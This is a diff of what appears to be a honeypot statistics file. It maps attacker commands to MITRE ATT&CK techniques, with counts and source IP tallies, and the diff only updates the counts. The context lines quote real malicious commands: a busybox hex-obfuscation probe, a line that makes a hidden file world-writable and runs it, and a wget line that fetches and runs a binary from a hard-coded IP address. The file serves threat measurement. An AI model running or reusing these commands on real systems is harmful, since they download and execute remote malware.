@@ -7,7 +7,7 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 124353,
+      "count": 124630,
       "distinct_ips": 399,
       "examples": [
         "/bin/busybox echo -e '\\x50\\x6f\\x72\\x74/tmp' > /tmp/.none; /bin/busybox cat /tmp/.none; /bin/busybox rm /tmp/.none",
@@ -24,7 +24,7 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 13562,
+      "count": 13601,
       "distinct_ips": 576,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/; ",
@@ -41,7 +41,7 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 2789,
+      "count": 2792,
       "distinct_ips": 425,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
@@ -184,6 +184,6 @@
       ]
     }
   ],
-  "total_commands": 386331,
-  "matched_commands": 138903
+  "total_commands": 386685,
+  "matched_commands": 139219
 }
